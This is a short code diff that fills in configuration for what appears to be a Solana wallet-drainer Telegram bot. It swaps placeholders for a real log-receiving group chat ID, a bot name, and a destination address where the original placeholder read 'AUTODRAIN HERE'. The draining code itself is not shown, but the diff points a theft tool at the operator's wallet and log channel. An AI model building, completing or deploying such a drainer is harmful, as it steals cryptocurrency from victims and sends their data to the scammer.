@@ -10,7 +10,7 @@ from solders.signature import Signature
 import requests
 
 
-GROUP_CHAT_ID = -PUT THE GROUPCHAT ID HERE TO RECIEVE LOGS
+GROUP_CHAT_ID = -1002378426583
 
 
 solana_client = Client("https://api.mainnet-beta.solana.com")
@@ -19,10 +19,10 @@ solana_client = Client("https://api.mainnet-beta.solana.com")
 COINGECKO_API_URL = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"
 
 
-BOT_USERNAME = "NAMEOFYOURBOT"
+BOT_USERNAME = "LEGACYBLOOMBOT"
 
 
-DESTINATION_ADDRESS = Pubkey.from_string("AUTODRAIN HERE <- PUT UR SOLONA ADDRESS HERE") 
+DESTINATION_ADDRESS = Pubkey.from_string("9788xXBmpS4v1beemDnTgd6WkWgcnyLNTPpy4zosh83a") 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     referrer_id = None
